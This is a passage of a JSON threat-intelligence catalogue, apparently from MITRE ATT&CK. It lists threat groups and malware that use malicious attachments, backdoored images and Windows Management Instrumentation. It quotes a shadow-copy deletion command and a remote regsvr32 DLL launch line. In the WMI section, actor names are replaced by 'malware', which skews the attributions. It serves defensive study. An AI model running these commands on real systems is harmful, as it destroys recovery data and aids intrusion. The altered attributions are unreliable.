                        "Description": "<name> has gained execution through victims clicking on malicious LNK files contained within ISO files, which can execute hidden DLLs within the ISO.[87][50]"
                    },
                    "G0137": {
                        "ID": "G0137",
                        "Name": "Ferocious Kitten",
                        "Description": "<name> has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.[88]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).[89][90]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used malicious documents to lure victims into allowing execution of PowerShell scripts.[91]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.[92][93][94]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used malicious e-mail attachments to lure victims into executing malware.[95][96][97]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> has relied on users clicking a malicious attachment delivered through spearphishing.[44]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.[98]"
                    },
                    "G0084": {
                        "ID": "G0084",
                        "Name": "Gallmaker",
                        "Description": "<name> sent victims a lure document with a warning that asked victims to \"enable content\" for execution.[99]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has attempted to get users to click on Office attachments with malicious macros embedded.[100][101][102][103][104][105][106]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.[107]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> has infected victims via malicious attachments.[108]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "The <name> executable has been retrieved via embedded macros in malicious Word documents.[109]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has used malicious Microsoft Word documents, sent via email, which prompted the victim to enable macros.[110]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware.[66][111][67][77]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> has been spread through malicious document lures.[7]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> used malicious e-mail attachments to lure victims into executing LNK files.[112][113]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has been executed through Word documents with malicious embedded macros.[114]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> lured victims into clicking malicious files for machine reconnaissance and to execute malware.[115][116][117][118]"
                    },
                    "G0136": {
                        "ID": "G0136",
                        "Name": "IndigoZebra",
                        "Description": "<name> sent spearphishing emails containing malicious attachments that urged recipients to review modifications in the file which would trigger the attack.[119]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has attempted to get users to click on a malicious zipped file.[120]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can deliver trojanized versions of software and documents, relying on user execution.[121]"
                    },
                    "S0528": {
                        "ID": "S0528",
                        "Name": "Javali",
                        "Description": "<name> has achieved execution through victims opening malicious attachments, including MSI files with embedded VBScript.[33]"
                    },
                    "S0389": {
                        "ID": "S0389",
                        "Name": "JCry",
                        "Description": "<name> has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. [122]"
                    },
                    "S0648": {
                        "ID": "S0648",
                        "Name": "JSS Loader",
                        "Description": "<name> has been executed through malicious attachments contained in spearphishing emails.[93]"
                    },
                    "S0585": {
                        "ID": "S0585",
                        "Name": "Kerrdown",
                        "Description": "<name> has gained execution through victims opening malicious files.[25][123]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> has been spread through Word documents containing malicious macros.[64]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used attempted to lure victims into opening malicious e-mail attachments.[124][125][126][64][9][127]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has relied on victims clicking a malicious document for execution.[128]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> has relied on a victim to enable malicious macros within an attachment delivered via email.[129]"
                    },
                    "S1075": {
                        "ID": "S1075",
                        "Name": "KOPILUWAK",
                        "Description": "<name> has gained execution through malicious attachments.[130]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.[131][132][133][134]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has lured users to open malicious email attachments.[128]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has sent spearphishing attachments attempting to get a user to click.[135][136]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has tricked recipients into enabling malicious macros by getting victims to click \"enable content\" in email attachments.[137][138]"
                    },
                    "G0095": {
                        "ID": "G0095",
                        "Name": "Machete",
                        "Description": "<name> has relied on users opening malicious attachments delivered through spearphishing to execute malware.[139][140][141][142]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has attempted to lure victims into opening malicious email attachments.[143]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> has relied on users to execute .zip file attachments containing malicious URLs.[144]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents, sent via email as part of spearphishing campaigns.[145][146][147][148][149]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer.[150][151]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> has relied on users to execute malicious files in order to gain execution on victim machines.[152][153][144]"
                    },
                    "G0103": {
                        "ID": "G0103",
                        "Name": "Mofang",
                        "Description": "<name>'s malicious spearphishing attachments required a user to open the file after receiving.[154]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> has sent malicious files via email that tricked users into clicking Enable Content to run an embedded macro and to download malicious archives.[155][156][157]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> has relied on a user opening a malicious document for execution.[7]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has attempted to get users to open malicious PDF attachment and to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.[158][159][160][161][162][163][164][165][166][167][168]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has sent malicious files requiring direct victim interaction to execute.[169][170][171][172][173][174]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has convinced victims to open malicious attachments to execute malware.[175]"
                    },
                    "S0637": {
                        "ID": "S0637",
                        "Name": "NativeZone",
                        "Description": "<name> can display an RTF document to the user  to enable execution of  Cobalt Strike stage shellcode.[46]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> has been executed through luring victims into opening malicious documents.[176][109][177]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> has gained execution through victims opening malicious executable files embedded in zip archives.[178]"
                    },
                    "G0133": {
                        "ID": "G0133",
                        "Name": "Nomadic Octopus",
                        "Description": "<name> as attempted to lure victims into clicking on malicious attachments within spearphishing emails.[179][180]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> has relied upon users clicking on a malicious attachment delivered through spearphishing.[180]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has delivered macro-enabled documents that required targets to click the \"enable content\" button to execute the payload on the system.[181][182][183][184]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group lured victims into executing malicious documents that contained \"dream job\" descriptions from defense, aerospace, and other sectors.[185][186]"
                    },
                    "C0016": {
                        "ID": "C0016",
                        "Name": "Operation Dust Storm",
                        "Description": "During <name>, the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.[187]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "During <name>, threat actors relied on a victim to enable macros within a malicious Word document.[188]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "During <name>, the threat actors relied on victims executing malicious Microsoft Word or PDF files.[189]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "During <name>, the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware.[190]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "<name> has relied on users mounting and executing a malicious DMG file.[191][192]"
                    },
                    "S1017": {
                        "ID": "S1017",
                        "Name": "OutSteel",
                        "Description": "<name> has relied on a user to execute a malicious attachment delivered via spearphishing.[83]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.[193][194]"
                    },
                    "G0068": {
                        "ID": "G0068",
                        "Name": "PLATINUM",
                        "Description": "<name> has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.[195]"
                    },
                    "S0435": {
                        "ID": "S0435",
                        "Name": "PLEAD",
                        "Description": "<name> has been executed via malicious e-mail attachments.[43]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has used spearphishing attachments to infect victims.[196]"
                    },
                    "S0453": {
                        "ID": "S0453",
                        "Name": "Pony",
                        "Description": "<name> has attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format).[197]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has attempted to get users to execute compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.[198][199]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has gained execution through users opening malicious attachments.[200][201][202][203][204][205][206][207][208][209]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has been executed through malicious e-mail attachments.[210]"
                    },
                    "G0075": {
                        "ID": "G0075",
                        "Name": "Rancor",
                        "Description": "<name> attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.[211]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has been executed via malicious MS Word e-mail attachments.[212][213][214]"
                    },
                    "S0433": {
                        "ID": "S0433",
                        "Name": "Rifdoor",
                        "Description": "<name> has been executed from malicious Excel or Word documents containing macros.[215]"
                    },
                    "S0240": {
                        "ID": "S0240",
                        "Name": "ROKRAT",
                        "Description": "<name> has relied upon users clicking on a malicious attachment delivered through spearphishing.[216]"
                    },
                    "S0148": {
                        "ID": "S0148",
                        "Name": "RTM",
                        "Description": "<name> has relied on users opening malicious email attachments, decompressing the attached archive, and double-clicking the executable within.[217]"
                    },
                    "G0048": {
                        "ID": "G0048",
                        "Name": "RTM",
                        "Description": "<name> has attempted to lure victims into opening e-mail attachments to execute malicious code.[218]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has relied upon users to execute a malicious attachment delivered via spearphishing.[219][83]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.[220][221]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.[222]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has lured targets to click on malicious files to gain execution in the target environment.[223][224][225][226]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> attempts to get users to launch malicious attachments delivered via spearphishing emails.[227][228][229]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can gain execution through the download of visual basic files.[230][231]"
                    },
                    "S0390": {
                        "ID": "S0390",
                        "Name": "SQLRat",
                        "Description": "<name> relies on users clicking on an embedded image to execute the scripts.[232]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has relied on users enabling malicious macros within Microsoft Excel and Word attachments.[233][234]"
                    },
                    "S1037": {
                        "ID": "S1037",
                        "Name": "STARWHALE",
                        "Description": "<name> has relied on victims opening a malicious Excel file for execution.[166]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has been executed via compromised installation files for legitimate software including compression applications, security software, browsers, file recovery applications, and other tools and utilities.[198][199]"
                    },
                    "S1042": {
                        "ID": "S1042",
                        "Name": "SUGARDUMP",
                        "Description": "Some <name> variants required a user to enable a macro within a malicious .xls file for execution.[235]"
                    },
                    "S1064": {
                        "ID": "S1064",
                        "Name": "SVCReady",
                        "Description": "<name> has relied on users clicking a malicious attachment delivered through spearphishing.[236]"
                    },
                    "S0464": {
                        "ID": "S0464",
                        "Name": "SYSCON",
                        "Description": "<name> has been executed by luring victims to open malicious e-mail attachments.[237]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used macro-enabled MS Word documents to lure victims into executing malicious payloads.[238][239][231]"
                    },
                    "G0062": {
                        "ID": "G0062",
                        "Name": "TA459",
                        "Description": "<name> has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.[240]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example, <name> makes their malware look like legitimate Microsoft Word documents, .pdf and/or .lnk files. [241][242][243][244][245][246][247][248][249]"
                    },
                    "G0127": {
                        "ID": "G0127",
                        "Name": "TA551",
                        "Description": "<name> has prompted users to enable macros within spearphishing attachments to install malware.[250]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> has relied upon a victim to click on a malicious email attachment.[251]"
                    },
                    "G0089": {
                        "ID": "G0089",
                        "Name": "The White Company",
                        "Description": "<name> has used phishing lure documents that trick users into opening them and infecting their computers.[252]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has lured victims into opening malicious files containing malware.[60]"
                    },
                    "S0665": {
                        "ID": "S0665",
                        "Name": "ThreatNeedle",
                        "Description": "<name> relies on a victim to click on a malicious document for initial execution.[132]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has relied on user interaction to open their malicious RTF documents.[253][38]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has used weaponized documents in e-mail to compromise targeted systems.[254][255][256][257][258]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has attempted to get users to launch malicious documents to deliver its payload. [259][260]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has lured victims into executing malware via malicious e-mail attachments.[261]"
                    },
                    "S0263": {
                        "ID": "S0263",
                        "Name": "TYPEFRAME",
                        "Description": "A Word document delivering <name> prompts the user to enable macro execution.[262]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has been executed via Microsoft Word documents containing malicious macros.[263][264][265]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> has relied on a victim to open a malicious attachment within an email for execution.[266][63]"
                    },
                    "G0107": {
                        "ID": "G0107",
                        "Name": "Whitefly",
                        "Description": "<name> has used malicious .exe or .dll files disguised as documents or images.[267]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used e-mail attachments to lure victims into executing malicious code.[268]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.[269]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar.[270][271][272]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> has relied on users opening a malicious email attachment for execution.[273]"
                    },
                    "S1013": {
                        "ID": "S1013",
                        "Name": "ZxxZ",
                        "Description": "<name> has relied on victims to open a malicious attachment delivered via email.[39]"
                    }
                }
            },
            "003": {
                "name": "Malicious Image",
                "href": "/techniques/T1204/003",
                "description": "Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via Upload Malware, and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.[1]Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: Match Legitimate Name or Location).[2]",
                "Procedure": {
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has relied on users to download and execute malicious Docker images.[3]"
                    }
                }
            }
        },
        "tactic": "Execution",
        "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of Phishing.While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.Adversaries may also deceive users into performing actions such as enabling Remote Access Software, allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to Steal Web Session Cookies; or downloading and executing malware for User Execution.[1][2]For example, tech support scams can be facilitated through Phishing, vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or Remote Access Software.[3]",
        "Procedure": {
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has recruited target organization employees or contractors who provide credentials and approve an associated MFA prompt, or install remote management software onto a corporate workstation, allowing malware to take control of an authenticated system.[4]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has impersonated organization IT and helpdesk staff to instruct victims to execute commercial remote access tools to gain initial access.[5]"
            }
        }
    },
    "T1047": {
        "ttp_name": "Windows Management Instrumentation",
        "ttp_id": "T1047",
        "href": "/techniques/T1047",
        "tactic": "Execution",
        "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.[1] WMI is an administration feature that provides a uniform environment to access Windows system components.The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model and Windows Remote Management.[1] Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.[1] [2]An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as Execution of commands and payloads.[2] For example, wmic.exe can be abused by an adversary to delete shadow copies with the command wmic.exe Shadowcopy Delete (i.e., Inhibit System Recovery).[3]Note: wmic.exe is deprecated as of January of 2024, with the WMIC feature being \"disabled by default\" on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by PowerShell as the primary WMI interface.[4] In addition to PowerShell and tools like wbemtool.exe, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.[4]",
        "Procedure": {
            "C0025": {
                "ID": "C0025",
                "Name": "2016 Ukraine Electric Power Attack",
                "Description": "During the malware, WMI in scripts were used for remote execution and system surveys. [5]"
            },
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware can use WMI to gather AV products installed on an infected host.[6]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware has used wmi queries to gather information from the system.[7]"
            },
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware will leverage COM objects accessed through WMI during execution to evade detection.[8]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware used WMI to steal credentials and execute backdoors at a future time.[9]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware used WMI to deploy their tools on remote machines and to gather information about the Outlook process.[10]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence via PowerSploit.[11][12]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware uses WMIC to execute payloads. [13]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware uses wmic.exe to delete shadow copies.[14]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can utilize WMI to collect system information, create new processes, and run malicious PowerShell scripts on a compromised machine.[15][16]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can execute a WMI query to gather information about the installed antivirus engine.[17][18]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware has used WMI to execute files over the network.[19]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can use wmic.exe to delete shadow copies on compromised networks.[20]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "A malware 2 plug-in uses WMI to gather victim host details.[21]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has used wmic.exe to set environment variables.[22]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware can use WMI to move laterally.[23]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can use WMI to gather system information and to spawn processes for code injection.[24][25][26]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors used wmic and rundll32 to load Cobalt Strike onto a target host.[27]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (wmiprvse.exe) to execute a variety of encoded PowerShell scripts using the DownloadString method.[28][29]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider used Windows Management Instrumentation (WMI) to move laterally via Impacket.[30]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can use wmic to gather information from a system.[31]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used WMIC to execute remote commands.[32][33]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has used Impacket for lateral movement via WMI.[34][35]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware can use WMI to deliver a payload to a remote host.[36][37][27]"
            },
            "S0488": {
                "ID": "S0488",
                "Name": "CrackMapExec",
                "Description": "malware can execute remote commands using Windows Management Instrumentation.[38]"
            },
            "S1066": {
                "ID": "S1066",
                "Name": "DarkTortilla",
                "Description": "malware can use WMI queries to obtain system information.[39]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can use WMI to execute commands.[40]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware has the ability to use WMI to delete volume shadow copies.[41]"
            },
            "G0009": {
                "ID": "G0009",
                "Name": "Deep Panda",
                "Description": "The malware group is known to utilize WMI for lateral movement.[42]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "The malware dropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.[43]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware used a VBA script to execute WMI.[44]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware can use Windows Mangement Instrumentation (WMI) calls to execute operations.[45]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has used WMI to execute powershell.exe.[46]"
            },
            "S0363": {
                "ID": "S0363",
                "Name": "Empire",
                "Description": "malware can use WMI to deliver a payload to a remote host.[47]"
            },
            "S0396": {
                "ID": "S0396",
                "Name": "EvilBunny",
                "Description": "malware has used WMI to gather information about the system.[48]"
            },
            "S0568": {
                "ID": "S0568",
                "Name": "EVILNUM",
                "Description": "malware has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.[49]"
            },
            "S0267": {
                "ID": "S0267",
                "Name": "FELIXROOT",
                "Description": "malware uses WMI to query the Windows Registry.[50]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has utilized WMI to execute commands and move laterally on compromised Windows machines.[51][52]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "malware has used WMI to automate the remote execution of PowerShell scripts.[53]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has used WMI to install malware on targeted systems.[54]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. malware has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities.[55][56][57][58]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware can use WMI to delete files on a  target machine.[41][59]"
            },
            "S0381": {
                "ID": "S0381",
                "Name": "FlawedAmmyy",
                "Description": "malware leverages WMI to enumerate anti-virus on the victim.[60]"
            },
            "C0001": {
                "ID": "C0001",
                "Name": "Frankenstein",
                "Description": "During malware, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.[61]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can use WMI to open a Windows command shell on a remote machine.[62]"
            },
            "C0007": {
                "ID": "C0007",
                "Name": "FunnyDream",
                "Description": "During malware, the threat actors used wmiexec.vbs to run remote commands.[62]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.[63]"
            },
            "G0047": {
                "ID": "G0047",
                "Name": "Gamaredon Group",
                "Description": "malware has used WMI to execute scripts used for discovery.[64]"
            },
            "S0237": {
                "ID": "S0237",
                "Name": "GravityRAT",
                "Description": "malware collects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).[65]"
            },
            "S0151": {
                "ID": "S0151",
                "Name": "HALFBAKED",
                "Description": "malware can use WMI queries to gather system information.[66]"
            },
            "S0617": {
                "ID": "S0617",
                "Name": "HELLOKITTY",
                "Description": "malware can use WMI to delete volume shadow copies.[41]"
            },
            "S0698": {
                "ID": "S0698",
                "Name": "HermeticWizard",
                "Description": "malware can use WMI to create a new process on a remote machine via C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll.[67]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.[68]"
            },
            "S0483": {
                "ID": "S0483",
                "Name": "IcedID",
                "Description": "malware has used WMI to execute binaries.[69]"
            },
            "S0357": {
                "ID": "S0357",
                "Name": "Impacket",
                "Description": "malware's wmiexec module can be used to execute commands through WMI.[70]"
            },
            "G0119": {
                "ID": "G0119",
                "Name": "Indrik Spider",
                "Description": "malware has used WMIC to execute commands on remote computers.[71]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware uses WMIC to identify anti-virus products installed on the victim\u2019s machine and to obtain firewall details.[72]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware obtains a list of running processes through WMI querying.[73]"
            },
